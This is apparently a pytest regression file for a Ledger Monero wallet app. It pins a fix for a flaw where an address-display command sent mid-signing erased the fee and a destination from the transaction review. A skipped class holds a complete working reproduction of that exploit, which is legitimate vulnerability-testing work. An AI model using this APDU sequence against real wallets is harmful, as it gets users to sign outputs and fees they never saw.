"""
On NBGL the review is accumulated, then drawn once. Non-terminal INS_VALIDATE
P1=2 appends "Amount"/"Destination" rows to transactionContext and replies
immediately, nothing on screen; only the terminal one draws the whole list.

INS_DISPLAY_ADDRESS is allowed at any time (check_ins_access lists it with no
tx_in_progress test) and display_account() borrows that same struct, setting
nbPairs = 1 instead of appending. Every queued row is dropped. amountNum and
addrNum are left alone, so later outputs keep appending and nothing notices.

Nor does the sequencer: INS_DISPLAY_ADDRESS is dispatched without
update_protocol(), so tx_state_ins/p1/p2 come out unchanged and the next
INS_VALIDATE passes its check as if nothing happened. Two kinds of
per-transaction state, only one of them guarded.

For the user: mid-signing the device drops to the home screen, then a review
appears showing one destination and no fee. They approve that; the device signs
the full output set.

The fix is two layers: check_ins_access() now refuses INS_DISPLAY_ADDRESS while
tx_in_progress, and the address screen was given its own tag/value struct so it
can no longer touch the review's. Only the first is observable from the host --
once the command is refused, display_account() is unreachable mid-transaction
and the separation cannot be exercised over APDUs. This file therefore pins the
gate, and the separation rides on it.

Classes, in file order:
  TestHonestNbglReviewIsComplete    control: fee and both amounts show, and an
                                    address still displays once the tx is
                                    closed. First, so a marker that stopped
                                    being readable fails here rather than
                                    letting a later assertion pass vacuously.
  TestDisplayAddressClobbersReview  the original exploit; skipped, since it now
                                    fails. --run-skipped re-confirms it against
                                    a build with neither layer (with only the
                                    gate reverted the review survives, so the
                                    "fee is gone" assertion still fails).
  TestDisplayAddressRefusedDuringTx the gate: interleaved at the point the
                                    exploit needed it, the command must be
                                    refused 0x6980. The refusal exits the app,
                                    so this goes last with nothing after it.

NBGL only: BAGL draws and confirms each output inside its own APDU, so there is
no pending list to clobber. The gate itself is device-wide, but it is only
reachable as a defect here.

Both destinations are the device's own primary address, so the amounts are what
tell the rows apart. That also keeps the transaction on the simplest key path
(all-standard: txkey_pub = R, no additional keys).

Run: pytest tests/test_vuln_display_address_review_clobber.py -v --device flex
     (DEBUG=1 build; add --golden_run once to record the snapshots)

The clobbered-review snapshots recorded before the fix are the evidence for what
was wrong; against a fixed build only the control's dirs are produced.

Snapshot dirs are named after the bare test function, so method names must stay
unique across the whole suite.
"""

import struct

import pytest

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator, NavInsID

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION, TESTS_ROOT_DIR
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys

ZERO_COMMITMENT = bytes(32)

# Distinct enough that no marker is a substring of another.
FEE = 11110000            # 0.00001111 XMR
AMOUNTS = [1234567890000,  # 1.23456789 XMR -- the output that gets hidden
           9876543210000]  # 9.87654321 XMR -- the terminal one, still shown

# The row display_account() leaves behind in the transaction review.
LEAKED_ROW = "Main address"

# nbgl_useCaseReview's finishTitle, set by start_signature(); marks the last page.
SIGN_PAGE = "Sign transaction"

SW_COMMAND_NOT_ALLOWED = 0x6980

# INS_DISPLAY_ADDRESS body: major, minor, payment id, and the byte the app
# fetches past. All zero = the primary address, p1 = 0 = not integrated.
_MAIN_ADDR_PAYLOAD = bytes(4) + bytes(4) + bytes(8) + bytes(1)


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _amount2str(piconero: int) -> str:
    """monero_amount2str(str_len=15), mirrored so the markers are derived rather
    than hand-copied: 12 decimals, zeros stripped both ends, 14 chars max."""
    if piconero == 0:
        return "0"
    digits = f"{piconero:021d}"
    s = digits[1:9] + "." + digits[9:]
    start = 0
    while s[start] == "0" and s[start] != ".":
        start += 1
    if s[start] == ".":
        start -= 1
    end = len(s) - 1
    while s[end] == "0" and s[end] != ".":
        end -= 1
    return s[start:end + 1][:14]


def _output_payload(view: bytes, spend: bytes, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes) -> bytes:
    """An INS_VALIDATE P1=2 record for a standard, non-change destination."""
    return b"".join((
        b"\x00",  # is_subaddress
        b"\x00",  # is_change
        view, spend, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _page_text(backend: BackendInterface) -> str:
    """Every text event on the current screen, joined."""
    return " | ".join(event.get("text", "")
                      for event in backend.get_current_screen_content()["events"])


def _read_review(backend: BackendInterface, navigator: Navigator,
                 snapshot_name: str, max_pages: int = 12) -> str:
    """Swipe through the review, snapshotting and returning every page, and stop
    on the hold-to-sign page so the caller can confirm.

    The page count is discovered, not scripted -- it is what differs between the
    two flows. Hence one capture at a time: navigate_and_compare with no
    instructions runs only its initial WAIT no-op, snapshotting the current
    screen.
    """
    backend.wait_for_text_on_screen("Review")
    pages = []
    for idx in range(max_pages):
        navigator.navigate_and_compare(
            TESTS_ROOT_DIR, snapshot_name, [],
            screen_change_before_first_instruction=False, snap_start_idx=idx)
        page = _page_text(backend)
        pages.append(page)
        if SIGN_PAGE in page:
            return " || ".join(pages)
        navigator.navigate([NavInsID.SWIPE_CENTER_TO_LEFT],
                           screen_change_before_first_instruction=False)
    raise AssertionError(
        f"never reached the '{SIGN_PAGE}' page in {max_pages} swipes; "
        f"saw: {' || '.join(pages)}")


def _send_terminal_output(monero: MoneroCmd, backend: BackendInterface,
                          navigator: Navigator, index: int, payload: bytes,
                          snapshot_name: str) -> str:
    """Terminal INS_VALIDATE P1=2: draws the review, read it, then approve.

    Not monero.validate_prehash_update(): it waits for "Processing", but the
    address review has left the device on the home screen, and it navigates by a
    precomputed swipe count -- the quantity under test.
    """
    with monero.transport.send_async(cla=PROTOCOL_VERSION,
                                     ins=InsType.INS_VALIDATE,
                                     p1=2, p2=index,
                                     option=0x02,  # terminal + short amount
                                     payload=payload):
        review = _read_review(backend, navigator, snapshot_name)
        navigator.navigate([NavInsID.USE_CASE_REVIEW_CONFIRM],
                           screen_change_before_first_instruction=False)

    sw, response = monero.transport.async_response()
    assert sw == 0x9000, f"terminal INS_VALIDATE refused: {hex(sw)}"
    assert len(response) == 0
    return review


def _setup_two_output_tx(monero: MoneroCmd, device, test_name: str, state):
    """Real transaction, two standard outputs, up to just before the fee."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    view, spend, addr = monero.get_public_keys()
    state["dest"] = Keys(public_view_key=view, public_spend_key=spend,
                         secret_view_key=None, secret_spend_key=None, addr=addr)

    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
    state["tx_pub_key"] = tx_pub_key

    eph_keys = []
    for index in range(2):
        ak, eph, _ = monero.gen_txout_keys(
            _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
            dst_pub_view_key=view, dst_pub_spend_key=spend,
            output_index=index, is_change_addr=False, is_subaddress=False)
        state["ak"].append(ak)
        eph_keys.append(eph)

    prefix = build_tx_prefix_outkeys(vout_keys=eph_keys, tx_pubkey=tx_pub_key)
    monero.prefix_hash_init(test_name, device, navigator=None, version=0, timelock=0)
    monero.prefix_hash_update(index=1, payload=prefix, is_last=True)

    # Two loops, not one: INS_GEN_COMMITMENT_MASK only follows INS_PREFIX_HASH or
    # itself, so an interleaved INS_BLIND would be refused 0x6980.
    masks = [monero.gen_commitment_mask(state["ak"][index]) for index in range(2)]
    for index in range(2):
        state["blinded"].append(monero.blind(
            _ak_amount=state["ak"][index], mask=masks[index],
            amount=AMOUNTS[index], is_short=True))


def _finalize_and_close(monero: MoneroCmd, state):
    """P1=3 for both outputs; the last returns the 32-byte pre-MLSAG hash."""
    for index in range(2):
        blinded_mask, blinded_amount = state["blinded"][index]
        monero.validate_prehash_finalize(
            index=index + 1, is_short=False, is_change_addr=False,
            is_subaddress=False,
            dst_pub_view_key=state["dest"].public_view_key,
            dst_pub_spend_key=state["dest"].public_spend_key,
            _ak_amount=state["ak"][index], commitment=ZERO_COMMITMENT,
            blinded_amount=blinded_amount, blinded_mask=blinded_mask,
            is_last=(index == 1))
    monero.close_tx()


def _tx_state():
    return {"dest": None, "tx_pub_key": None, "ak": [], "blinded": [], "review": ""}


@pytest.mark.incremental
class TestHonestNbglReviewIsComplete:
    """Control: without interleaving the review carries the fee and both amounts,
    so their absence in the next class means something."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def _nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL only; BAGL draws each output inside its own APDU")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _tx_state()

    @staticmethod
    def test_complete_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_two_output_tx(monero, device, test_name, state)

    @staticmethod
    def test_complete_review_shows_fee_and_both_outputs(monero: MoneroCmd,
                                                        backend: BackendInterface,
                                                        navigator: Navigator,
                                                        device, test_name: str,
                                                        state):
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)

        blinded_mask, blinded_amount = state["blinded"][0]
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["dest"].public_view_key,
            dst_pub_spend_key=state["dest"].public_spend_key,
            _ak_amount=state["ak"][0], commitment=ZERO_COMMITMENT,
            blinded_amount=blinded_amount, blinded_mask=blinded_mask,
            is_last=False)

        blinded_mask, blinded_amount = state["blinded"][1]
        review = _send_terminal_output(
            monero, backend, navigator, 2,
            _output_payload(state["dest"].public_view_key,
                            state["dest"].public_spend_key,
                            state["ak"][1], blinded_mask, blinded_amount),
            test_name + "_review")

        for label, marker in (("fee", _amount2str(FEE)),
                              ("output 0", _amount2str(AMOUNTS[0])),
                              ("output 1", _amount2str(AMOUNTS[1]))):
            assert marker in review, (
                f"the honest review is missing the {label} amount {marker!r}; the "
                f"markers below are unusable as evidence. Review text: {review}")
        assert LEAKED_ROW not in review

    @staticmethod
    def test_complete_finalize(monero: MoneroCmd, state):
        _finalize_and_close(monero, state)

    @staticmethod
    def test_complete_address_display_works_after_close(monero: MoneroCmd, device,
                                                        navigator: Navigator,
                                                        test_name: str):
        """The gate must lift with the transaction. monero_reset_tx clears
        tx_in_progress on close and abort, so an address still displays here --
        without this, a gate that stuck would look like a pass everywhere else."""
        monero.display_address(test_name, device, navigator,
                               _MAIN_ADDR_PAYLOAD[:16], _MAIN_ADDR_PAYLOAD[16:], 2)


@pytest.mark.skip(reason="Demonstrates the (now-fixed) review clobber; passes only on a "
                         "build with neither the tx_in_progress gate nor the separate "
                         "address context. Pass --run-skipped to re-confirm the exploit.")
@pytest.mark.incremental
class TestDisplayAddressClobbersReview:
    """The exploit. One INS_DISPLAY_ADDRESS between the two outputs erases the
    fee and the first destination from the review the user approves."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def _nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL only; BAGL draws each output inside its own APDU")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _tx_state()

    @staticmethod
    def test_clobber_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_two_output_tx(monero, device, test_name, state)

    @staticmethod
    def test_clobber_queue_fee_and_first_output(monero: MoneroCmd,
                                                backend: BackendInterface,
                                                navigator: Navigator,
                                                device, test_name: str, state):
        """Three rows now queued and invisible: no screen drawn, both APDUs
        answered 0x9000."""
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)

        blinded_mask, blinded_amount = state["blinded"][0]
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["dest"].public_view_key,
            dst_pub_spend_key=state["dest"].public_spend_key,
            _ak_amount=state["ak"][0], commitment=ZERO_COMMITMENT,
            blinded_amount=blinded_amount, blinded_mask=blinded_mask,
            is_last=False)

    @staticmethod
    def test_clobber_display_address_accepted_mid_transaction(monero: MoneroCmd,
                                                              device,
                                                              navigator: Navigator,
                                                              test_name: str):
        """Sent with a transaction half-reviewed: answered, not refused, and it
        dismisses to the home screen."""
        major = (0).to_bytes(4, byteorder="little")
        minor = (0).to_bytes(4, byteorder="little")
        monero.display_address(test_name, device, navigator,
                               major + minor + bytes(8), bytes(1), 2)

    @staticmethod
    def test_clobber_review_lost_fee_and_first_output(monero: MoneroCmd,
                                                      backend: BackendInterface,
                                                      navigator: Navigator,
                                                      test_name: str, state):
        """The terminal output draws the review, and it no longer describes the
        transaction being signed."""
        blinded_mask, blinded_amount = state["blinded"][1]
        review = _send_terminal_output(
            monero, backend, navigator, 2,
            _output_payload(state["dest"].public_view_key,
                            state["dest"].public_spend_key,
                            state["ak"][1], blinded_mask, blinded_amount),
            test_name + "_review")
        state["review"] = review

        # Sanity: right screen, terminal output present.
        assert _amount2str(AMOUNTS[1]) in review, (
            f"the terminal output is missing too -- wrong screen? Review: {review}")

        assert _amount2str(AMOUNTS[0]) not in review, (
            "not reproduced: the first destination survived the interleaved "
            f"INS_DISPLAY_ADDRESS. Is this a fixed build? Review: {review}")
        assert _amount2str(FEE) not in review, (
            "not reproduced: the fee survived the interleaved INS_DISPLAY_ADDRESS. "
            f"Is this a fixed build? Review: {review}")
        assert LEAKED_ROW in review, (
            "the address screen's own row is not in the transaction review; the "
            f"clobber may have taken a different shape. Review: {review}")

    @staticmethod
    def test_clobber_signs_the_unreviewed_output_set(monero: MoneroCmd, state):
        """The user approved one destination and no fee; the device still returns
        the pre-MLSAG hash for both. That hash is what INS_MLSAG/CLSAG signs."""
        _finalize_and_close(monero, state)


@pytest.mark.incremental
class TestDisplayAddressRefusedDuringTx:
    """The gate, exercised where the exploit needed it: after the fee and one
    output are queued, with rows pending and nothing yet on screen."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def _nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL only; BAGL draws each output inside its own APDU")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return _tx_state()

    @staticmethod
    def test_gate_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_two_output_tx(monero, device, test_name, state)

    @staticmethod
    def test_gate_queue_fee_and_first_output(monero: MoneroCmd,
                                             backend: BackendInterface,
                                             navigator: Navigator,
                                             device, test_name: str, state):
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)

        blinded_mask, blinded_amount = state["blinded"][0]
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["dest"].public_view_key,
            dst_pub_spend_key=state["dest"].public_spend_key,
            _ak_amount=state["ak"][0], commitment=ZERO_COMMITMENT,
            blinded_amount=blinded_amount, blinded_mask=blinded_mask,
            is_last=False)

    @staticmethod
    def test_gate_display_address_refused_mid_transaction(backend: BackendInterface):
        """Sent raw: a refusal never reaches the address screen, so there is
        nothing to navigate. Last test in the file -- the app exits here."""
        apdu = _raw_apdu(InsType.INS_DISPLAY_ADDRESS, 0, 0, 0x00,
                         _MAIN_ADDR_PAYLOAD)
        try:
            sw = backend.exchange_raw(apdu).status
        except ExceptionRAPDU as exc:
            sw = exc.status
        assert sw == SW_COMMAND_NOT_ALLOWED, (
            f"expected the address display to be refused mid-transaction "
            f"({hex(SW_COMMAND_NOT_ALLOWED)}), got {hex(sw)}")
